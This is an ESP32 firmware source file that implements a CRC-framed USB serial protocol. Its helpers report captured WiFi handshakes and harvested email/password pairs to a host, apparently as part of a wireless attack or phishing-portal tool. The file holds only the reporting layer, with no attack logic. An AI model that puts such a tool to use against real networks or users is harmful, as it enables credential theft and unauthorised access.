// main/usb_protocol.c
#include "usb_protocol.h"
#include "driver/usb_serial_jtag.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "usb_protocol";

#define SYNC_BYTE 0xAA

static SemaphoreHandle_t s_tx_mutex = NULL;

static uint16_t crc16(const uint8_t *data, size_t len)
{
    uint16_t crc = 0xFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= (uint16_t)data[i] << 8;
        for (int b = 0; b < 8; b++) {
            if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
            else              crc <<= 1;
        }
    }
    return crc;
}

uint16_t usb_protocol_crc16(const uint8_t *data, size_t len)
{
    return crc16(data, len);
}

esp_err_t usb_protocol_init(void)
{
    if (s_tx_mutex == NULL) {
        s_tx_mutex = xSemaphoreCreateMutex();
        if (s_tx_mutex == NULL) {
            ESP_LOGE(TAG, "mutex create failed");
            return ESP_ERR_NO_MEM;
        }
    }
    return ESP_OK;
}

esp_err_t usb_send_typed_packet(uint8_t type, const uint8_t *data, size_t len)
{
    if (len > MAX_PACKET_LEN) len = MAX_PACKET_LEN;

    if (s_tx_mutex == NULL) {
        s_tx_mutex = xSemaphoreCreateMutex();
        if (s_tx_mutex == NULL) return ESP_ERR_NO_MEM;
    }

    if (xSemaphoreTake(s_tx_mutex, pdMS_TO_TICKS(200)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    uint16_t crc = crc16(data, len);

    uint8_t header[6];
    header[0] = SYNC_BYTE;
    header[1] = type;
    header[2] = (len >> 8) & 0xFF;
    header[3] = len & 0xFF;
    header[4] = (crc >> 8) & 0xFF;
    header[5] = crc & 0xFF;

    int wrote = usb_serial_jtag_write_bytes(header, sizeof(header),
                                            pdMS_TO_TICKS(100));
    if (wrote != (int)sizeof(header)) {
        xSemaphoreGive(s_tx_mutex);
        return ESP_FAIL;
    }

    if (len > 0) {
        wrote = usb_serial_jtag_write_bytes(data, len, pdMS_TO_TICKS(100));
        if (wrote != (int)len) {
            xSemaphoreGive(s_tx_mutex);
            return ESP_FAIL;
        }
    }

    xSemaphoreGive(s_tx_mutex);
    return ESP_OK;
}

void usb_send_status(const char *text)
{
    if (!text) return;
    size_t len = strlen(text);
    if (len == 0 || len > MAX_PACKET_LEN) return;
    usb_send_typed_packet(USB_TYPE_STATUS, (const uint8_t *)text, len);
}

void usb_send_handshake(const char *bssid, const char *ssid, const char *path)
{
    char buf[MAX_PACKET_LEN];
    int n = snprintf(buf, sizeof(buf), "%s|%s|%s",
                     bssid ? bssid : "?",
                     ssid  ? ssid  : "?",
                     path  ? path  : "?");
    if (n <= 0 || n >= (int)sizeof(buf)) return;
    usb_send_typed_packet(USB_TYPE_HANDSHAKE, (const uint8_t *)buf, (size_t)n);
}

void usb_send_credential(const char *email, const char *password)
{
    if (!email || !password) return;
    size_t e_len = strlen(email);
    size_t p_len = strlen(password);
    if (e_len + 1 + p_len > MAX_PACKET_LEN) return;

    char buf[MAX_PACKET_LEN];
    memcpy(buf, email, e_len);
    buf[e_len] = '\0';
    memcpy(buf + e_len + 1, password, p_len);

    usb_send_typed_packet(USB_TYPE_CREDENTIAL, (const uint8_t *)buf,
                          e_len + 1 + p_len);
}